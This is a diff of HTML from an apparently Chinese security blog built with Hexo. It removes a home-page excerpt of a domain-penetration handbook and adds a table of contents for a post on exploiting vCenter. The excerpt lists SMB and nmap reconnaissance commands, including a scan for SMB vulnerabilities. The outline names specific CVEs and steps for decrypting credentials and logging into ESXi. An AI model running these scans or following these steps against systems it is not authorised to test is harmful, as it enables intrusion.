-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-域渗透一条龙手册" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/10/18/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99%E6%89%8B%E5%86%8C/">域渗透一条龙手册</a>
-    </h1>
-  
-
-        
-        <a href="/2022/10/18/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99%E6%89%8B%E5%86%8C/" class="archive-article-date">
-  	<time datetime="2022-10-17T19:01:17.582Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a>1.无凭证情况下</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; 							# ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	# 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						# 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			# 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						# UDP 扫描</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2>
-        
-          <a class="article-more-a" href="/2022/10/18/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99%E6%89%8B%E5%86%8C/#more">more >></a>
-        
-      
-
       
 
     </div>
@@ -901,16 +457,81 @@
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/10/18/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99%E6%89%8B%E5%86%8C/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          在IPA中重签名iOS应用程序
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Elasticsearch基础（二）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -925,99 +546,32 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-VisualStudio Code settings配置项" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/09/22/VisualStudio%20Code%20settings%E9%85%8D%E7%BD%AE%E9%A1%B9/">Visual Studio Code settings配置项</a>
-    </h1>
-  
-
-        
-        <a href="/2022/09/22/VisualStudio%20Code%20settings%E9%85%8D%E7%BD%AE%E9%A1%B9/" class="archive-article-date">
-  	<time datetime="2022-09-22T15:48:39.723Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在 VS Code 中，使用快捷键：<code>command+shift+P</code>C修改为如下setting配置项</p>
-<p>defaulttings.json</p>
-        
-          <a class="article-more-a" href="/2022/09/22/VisualStudio%20Code%20settings%E9%85%8D%E7%BD%AE%E9%A1%B9/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/golang//" class="article-tag-list-link color2">golang</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/09/22/VisualStudio%20Code%20settings%E9%85%8D%E7%BD%AE%E9%A1%B9/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">Vcenter实战利用方式总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81"><span class="toc-number">2.</span> <span class="toc-text">0x01 指纹特征</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%9F%A5%E7%9C%8BVcenter%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">0x02 查看Vcenter版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-CVE-2021-21972"><span class="toc-number">4.</span> <span class="toc-text">0x03 CVE-2021-21972</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-CVE-2021-22005"><span class="toc-number">5.</span> <span class="toc-text">0x04 CVE-2021-22005</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-CVE-2021-44228"><span class="toc-number">6.</span> <span class="toc-text">0x05 CVE-2021-44228</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E8%8E%B7%E5%8F%96vcenter-web%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">7.</span> <span class="toc-text">0x06 获取vcenter-web控制台权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text">重置密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E7%99%BB%E5%BD%95"><span class="toc-number">7.2.</span> <span class="toc-text">cookie登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E9%87%8D%E7%BD%AE%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%EF%BC%88ESXI%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">不重置获取密码（ESXI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96%E8%A7%A3%E5%AF%86key"><span class="toc-number">7.3.1.</span> <span class="toc-text">1、获取解密key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">7.3.2.</span> <span class="toc-text">2、获取数据库账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86"><span class="toc-number">7.3.3.</span> <span class="toc-text">3、使用脚本解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E7%99%BB%E5%BD%95ESXI"><span class="toc-number">7.3.4.</span> <span class="toc-text">4、登录ESXI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E8%8E%B7%E5%8F%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9D%83%E9%99%90"><span class="toc-number">8.</span> <span class="toc-text">0x07 获取虚拟机权限</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
+  
 
   
+
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+
+  
+
   
 
 
@@ -1040,8 +594,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
